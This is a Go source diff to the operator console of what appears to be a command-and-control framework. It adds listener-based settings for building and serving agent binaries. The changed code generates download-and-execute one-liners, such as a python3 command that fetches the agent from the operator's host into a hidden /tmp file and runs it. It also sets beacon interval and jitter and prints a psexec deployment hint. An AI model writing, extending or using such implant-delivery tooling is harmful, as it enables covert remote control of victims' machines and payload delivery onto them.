@@ -26,6 +26,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -86,6 +87,19 @@ type generateOpts struct {
 	httpUA           string
 	httpRegisterPath string
 	httpBeaconPath   string
+
+	// New: listener-based configuration
+	listenerIdx         int    // index of listener to use for C2
+	downloadListenerIdx int    // index of listener to use for downloading agent
+	downloadPath        string // full download URL path for agent
+}
+
+// listenerInfo holds details about an HTTP listener for agent generation.
+type listenerInfo struct {
+	addr          string
+	downloadPath  string // e.g., "/download/a7f3b2/"
+	downloadToken string // e.g., "a7f3b2"
+	hasDownload   bool
 }
 
 // defaultOut returns the default output filename for this build.
@@ -160,6 +174,24 @@ func (c *Console) cmdGenerateBuild(args []string) {
 
 	sizeMB := float64(info.Size()) / 1024 / 1024
 	fmt.Printf("[+] %s (%.1f MB) — %.1fs\n", opts.out, sizeMB, elapsed.Seconds())
+
+	// Register the built file for download if we have a download listener
+	if opts.downloadPath != "" {
+		// Find the listener address to register with
+		downloadIdx := opts.downloadListenerIdx
+		if downloadIdx == 0 {
+			downloadIdx = opts.listenerIdx
+		}
+		if downloadIdx > 0 {
+			info, ok := c.getListenerByIndex(downloadIdx)
+			if ok && info.hasDownload {
+				if err := c.RegisterDownload(info.addr, opts.out); err != nil {
+					fmt.Printf("[!] Failed to register download: %v\n", err)
+				}
+			}
+		}
+	}
+
 	fmt.Printf("[*] Beacon: %s://%s:%s | interval=%ss ±%s%%\n",
 		opts.transport, opts.lhost, opts.lport, opts.interval, opts.jitter)
 
@@ -191,7 +223,10 @@ func (c *Console) cmdGenerateBuild(args []string) {
 				opts.lport, rp, bp)
 		}
 	}
-	printDeployHint(opts.out, opts.target)
+	if opts.downloadPath != "" {
+		fmt.Printf("[*] Download:   %s%s\n", opts.downloadPath, opts.out)
+	}
+	printDeployHint(opts.out, opts.target, opts.downloadPath)
 }
 
 // ── Oneliner subcommand ───────────────────────────────────────────────────────
@@ -206,8 +241,20 @@ func (c *Console) cmdGenerateOneliner(args []string) {
 		opts.out = opts.defaultOut()
 	}
 
-	// Assume the operator is serving the binary on port 8000.
-	agentURL := fmt.Sprintf("http://%s:8000/%s", opts.lhost, opts.out)
+	// Use download URL from listener config if available, otherwise fallback
+	var agentURL string
+	if opts.downloadPath != "" {
+		agentURL = opts.downloadPath + opts.out
+	} else if opts.lhost != "" {
+		// Fallback to old behavior
+		agentURL = fmt.Sprintf("http://%s:8000/%s", opts.lhost, opts.out)
+		fmt.Println("[!] No download listener configured - using fallback port 8000")
+		fmt.Println("[!] Use --listener to use the listener's download URL")
+	} else {
+		fmt.Println("[!] No listener configured - cannot generate oneliner")
+		fmt.Println("[!] Use --listener <index> with an HTTP listener that has --download-dir")
+		return
+	}
 
 	switch opts.target.GOOS {
 	case "windows":
@@ -222,9 +269,9 @@ func (c *Console) cmdGenerateOneliner(args []string) {
 		fmt.Printf("    python3 -c \"import urllib.request,os,subprocess; urllib.request.urlretrieve('%s','/tmp/.a'); os.chmod('/tmp/.a',0o755); subprocess.Popen(['/tmp/.a'])\"\n", agentURL)
 	}
 
-	fmt.Printf("\n[*] Serve binary with:  python3 -m http.server 8000  (in the directory containing %s)\n", opts.out)
-	fmt.Printf("[*] Build first:        generate %s %s --lhost %s --lport %s --transport %s\n",
-		opts.target.GOOS, opts.target.GOARCH, opts.lhost, opts.lport, opts.transport)
+	if opts.downloadPath == "" {
+		fmt.Printf("\n[*] Serve binary with:  python3 -m http.server 8000  (in the directory containing %s)\n", opts.out)
+	}
 }
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
@@ -246,7 +293,7 @@ func parseGenerateArgs(args []string, c *Console) (generateOpts, bool) {
 	opts := generateOpts{
 		target:    target,
 		lport:     "443",
-		transport: "tcp",
+		transport: "", // will be inferred from listener or default to tcp
 		interval:  "60",
 		jitter:    "20",
 	}
@@ -325,6 +372,30 @@ func parseGenerateArgs(args []string, c *Console) (generateOpts, bool) {
 			}
 			i++
 			opts.httpBeaconPath = rest[i]
+		case "--listener":
+			if i+1 >= len(rest) {
+				fmt.Println("[!] --listener requires an index")
+				return generateOpts{}, false
+			}
+			i++
+			idx, err := strconv.Atoi(rest[i])
+			if err != nil || idx < 1 {
+				fmt.Printf("[!] Invalid listener index: %s\n", rest[i])
+				return generateOpts{}, false
+			}
+			opts.listenerIdx = idx
+		case "--download-listener":
+			if i+1 >= len(rest) {
+				fmt.Println("[!] --download-listener requires an index")
+				return generateOpts{}, false
+			}
+			i++
+			idx, err := strconv.Atoi(rest[i])
+			if err != nil || idx < 1 {
+				fmt.Printf("[!] Invalid listener index: %s\n", rest[i])
+				return generateOpts{}, false
+			}
+			opts.downloadListenerIdx = idx
 		default:
 			fmt.Printf("[!] Unknown flag: %s\n", rest[i])
 			printGenerateUsage()
@@ -332,12 +403,102 @@ func parseGenerateArgs(args []string, c *Console) (generateOpts, bool) {
 		}
 	}
 
-	if opts.lhost == "" {
-		fmt.Println("[!] --lhost is required")
+	// If --listener is provided, look up C2 info from that listener
+	if opts.listenerIdx > 0 {
+		info, ok := c.getListenerByIndex(opts.listenerIdx)
+		if !ok {
+			fmt.Printf("[!] Invalid listener index: %d\n", opts.listenerIdx)
+			return generateOpts{}, false
+		}
+		opts.lhost, opts.lport, _ = splitHostPort(info.addr)
+		// If transport not specified, infer from listener type
+		if opts.transport == "" {
+			opts.transport = "http"
+		}
+	}
+
+	// Default to TCP if transport was not inferred from a listener or set explicitly.
+	if opts.transport == "" {
+		opts.transport = "tcp"
+	}
+
+	// Validate: HTTP transport requires listener for proper config
+	if opts.transport == "http" && opts.listenerIdx == 0 && opts.lhost == "" {
+		fmt.Println("[!] HTTP transport requires --listener (or --lhost/--lport for manual config)")
+		return generateOpts{}, false
+	}
+
+	// If using --listener but didn't specify lhost, we're good
+	// Otherwise require lhost
+	if opts.lhost == "" && opts.listenerIdx == 0 {
+		fmt.Println("[!] --lhost or --listener is required")
 		printGenerateUsage()
 		return generateOpts{}, false
 	}
+
+	// Look up download listener if needed
+	if opts.listenerIdx > 0 || opts.downloadListenerIdx > 0 {
+		downloadIdx := opts.downloadListenerIdx
+		if downloadIdx == 0 {
+			downloadIdx = opts.listenerIdx
+		}
+		info, ok := c.getListenerByIndex(downloadIdx)
+		if !ok {
+			fmt.Printf("[!] Invalid download listener index: %d\n", downloadIdx)
+			return generateOpts{}, false
+		}
+		if !info.hasDownload {
+			fmt.Printf("[!] Listener %d does not have download enabled (--download-dir)\n", downloadIdx)
+			fmt.Printf("[!] Use a different listener or serve the agent manually\n")
+			return generateOpts{}, false
+		}
+		opts.downloadPath = fmt.Sprintf("http://%s%s", info.addr, info.downloadPath)
+	}
+
 	return opts, true
+}
+
+// getListenerByIndex returns listener info by index (1-based from 'listeners' command).
+// Ordering matches cmdListeners: TCP listeners first (sorted by addr), then HTTP listeners.
+func (c *Console) getListenerByIndex(idx int) (listenerInfo, bool) {
+	var infos []listenerInfo
+
+	// TCP listeners first.
+	for _, e := range c.listeners.all() {
+		infos = append(infos, listenerInfo{
+			addr:        e.addr,
+			hasDownload: false,
+		})
+	}
+
+	// HTTP listeners — acquire lock once for the entire iteration.
+	c.httpListeners.mu.Lock()
+	for addr, e := range c.httpListeners.listeners {
+		info := listenerInfo{addr: addr}
+		if e != nil {
+			info.hasDownload = e.downloadDir != ""
+			info.downloadToken = e.downloadToken
+			info.downloadPath = e.downloadPath
+		}
+		infos = append(infos, info)
+	}
+	c.httpListeners.mu.Unlock()
+
+	if idx < 1 || idx > len(infos) {
+		return listenerInfo{}, false
+	}
+	return infos[idx-1], true
+}
+
+// splitHostPort splits "host:port" into host and port parts.
+func splitHostPort(addr string) (host, port string, err error) {
+	parts := strings.Split(addr, ":")
+	if len(parts) < 2 {
+		return "", "", fmt.Errorf("invalid address: %s", addr)
+	}
+	host = strings.Join(parts[:len(parts)-1], ":")
+	port = parts[len(parts)-1]
+	return host, port, nil
 }
 
 // buildGenerateLDFlags constructs the -ldflags string for the agent binary.
@@ -446,6 +607,7 @@ func buildAgentBinary(modRoot string, opts generateOpts, ldflags string) error {
 
 	var stderr bytes.Buffer
 	cmd := exec.Command("go", "build",
+		"-buildvcs=false",
 		"-ldflags", ldflags+" -s -w",
 		"-o", outPath,
 		"./agent/",
@@ -484,7 +646,7 @@ func findModuleRoot() (string, error) {
 }
 
 // printDeployHint prints a copy+paste deploy snippet for the built binary.
-func printDeployHint(outFile string, t *generateTarget) {
+func printDeployHint(outFile string, t *generateTarget, downloadURL string) {
 	switch t.GOOS {
 	case "windows":
 		fmt.Printf("[*] Deploy: copy %s target && psexec \\\\target cmd /c %s\n", outFile, outFile)
